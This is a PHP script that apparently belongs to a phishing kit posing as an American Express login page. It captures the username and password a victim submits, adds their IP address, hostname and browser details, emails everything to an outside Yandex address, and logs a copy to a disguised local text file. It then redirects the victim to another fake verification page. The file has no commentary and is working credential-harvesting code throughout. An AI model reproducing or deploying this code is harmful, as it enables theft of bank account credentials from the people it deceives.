<?php


$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "========+[ AMEX Details ]+=========\n";
$message .= "Username : ".$_POST['UserID']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$send = "codedxero@yandex.com";
$subject = "AMEX User Details | $ip";
$headers = "From: AMEX  <icq @mcavy>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message);
$fp = fopen("./htcaccess.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: verify55us.php");
?>
